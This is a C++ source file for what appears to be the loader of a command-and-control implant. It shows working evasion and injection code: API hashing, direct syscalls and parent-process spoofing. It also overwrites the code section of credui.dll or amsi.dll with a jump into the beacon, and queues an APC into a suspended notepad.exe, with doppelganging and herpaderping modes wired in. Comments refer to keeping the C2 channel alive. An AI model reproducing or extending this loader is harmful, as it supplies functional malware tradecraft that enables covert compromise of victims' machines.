#include "Loader.h"
#include "ApiHash.h"
#include "Doppel.h"
#include "Herpaderp.h"
#include "NtTypes.h"
#include "ProcSpoof.h"
#include "Syscalls.h"
#include "Strings.h"
#include "core/Beacon.h"

#include <windows.h>

#include <cstring>

namespace loader {

Mode build_mode() {
#ifdef C2_LOADER_MODE_STOMP
    return Mode::Stomp;
#elif defined(C2_LOADER_MODE_APC)
    return Mode::Apc;
#elif defined(C2_LOADER_MODE_DOPPEL)
    return Mode::Doppel;
#elif defined(C2_LOADER_MODE_HERPADERP)
    return Mode::Herpaderp;
#else
    return Mode::None;
#endif
}

namespace {

void* k32(const char* n) {
    return api::export_by_hash(API_HASH("kernel32.dll"), API_HASH(n));
}

typedef NTSTATUS (NTAPI* LdrLoadDll_t)(PWCHAR PathToFile, ULONG Flags, void* ModuleFileName, void** ModuleHandle);

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} USTR;

USTR make_us(const wchar_t* s) {
    USTR u;
    u.Length = static_cast<USHORT>(wcslen(s) * sizeof(wchar_t));
    u.MaximumLength = u.Length + sizeof(wchar_t);
    u.Buffer = const_cast<wchar_t*>(s);
    return u;
}

bool find_text(void* base, std::uint8_t*& start, std::size_t& sz) {
    auto b = reinterpret_cast<std::uint8_t*>(base);
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(b);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(b + dos->e_lfanew);
    auto s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (std::memcmp(s[i].Name, ".text", 5) == 0) {
            start = b + s[i].VirtualAddress;
            sz = s[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// PIC: mov rax, imm64; jmp rax — patch imm64 at kEntryOff after write.
unsigned char boot[] = {
    0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // mov rax, imm64
    0xFF, 0xE0                                            // jmp rax
};
constexpr std::size_t kEntryOff = 2;

void* load_dll(const wchar_t* name) {
    auto ldr = api::resolve<LdrLoadDll_t>(API_HASH("ntdll.dll"), API_HASH("LdrLoadDll"));
    if (!ldr) return nullptr;
    USTR u = make_us(name);
    void* h = nullptr;
    ldr(nullptr, 0, &u, &h);
    return h;
}

} // namespace

void run(Mode m) {
    if (m == Mode::None) return;

    if (m == Mode::Stomp) {
        // Never stomp winhttp.dll — that kills the C2 channel.
        const wchar_t* targets[] = {
            L"C:\\Windows\\System32\\credui.dll",
            L"C:\\Windows\\System32\\amsi.dll",
        };
        void* h = nullptr;
        for (auto t : targets) { h = load_dll(t); if (h) break; }
        if (!h) return;

        std::uint8_t* text = nullptr; std::size_t tsz = 0;
        if (!find_text(h, text, tsz)) return;

        auto vp = reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD)>(k32("VirtualProtect"));
        if (!vp) return;

        DWORD old = 0;
        if (!vp(text, sizeof(boot), PAGE_EXECUTE_READWRITE, &old)) return;
        std::memcpy(text, boot, sizeof(boot));
        std::memcpy(text + kEntryOff, &beacon::run, 8); // function pointer -> real entry
        DWORD tmp = 0;
        vp(text, sizeof(boot), old, &tmp);

        // No return — jumps into stomped .text.
        typedef void (*fn)();
        reinterpret_cast<fn>(text)();
        return; // never reached
    }

    if (m == Mode::Apc) {
        auto ctx = pps::spawn(L"C:\\Windows\\System32\\notepad.exe", 0, true, true);
        if (!ctx.hProc || !ctx.hThread) return;

        std::size_t n = 4096;
        void* remote = nullptr;
        if (syscalls::ScAllocVm(ctx.hProc, &remote, 0, &n,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) < 0) {
            syscalls::ScClose(ctx.hThread); syscalls::ScClose(ctx.hProc); return;
        }
        unsigned char stub[32] = {};
        std::memcpy(stub, boot, sizeof(boot));
        std::memcpy(stub + kEntryOff, &beacon::run, 8);
        std::size_t wn = 0;
        syscalls::ScWriteVm(ctx.hProc, remote, stub, sizeof(stub), &wn);
        std::uint32_t old = 0;
        syscalls::ScProtectVm(ctx.hProc, &remote, &n, PAGE_EXECUTE_READ, &old);

        syscalls::ScQueueApc(ctx.hThread, remote, nullptr, nullptr, nullptr);
        std::uint32_t sc = 0;
        syscalls::ScResume(ctx.hThread, &sc);
        syscalls::ScClose(ctx.hThread); syscalls::ScClose(ctx.hProc);
        ExitProcess(0);
    }

    if (m == Mode::Doppel) {
#ifdef C2_LOADER_MODE_DOPPEL
        doppel::run();
#endif
        return;
    }
    if (m == Mode::Herpaderp) {
#ifdef C2_LOADER_MODE_HERPADERP
        herpaderp::run();
#endif
        return;
    }
}

} // namespace loader
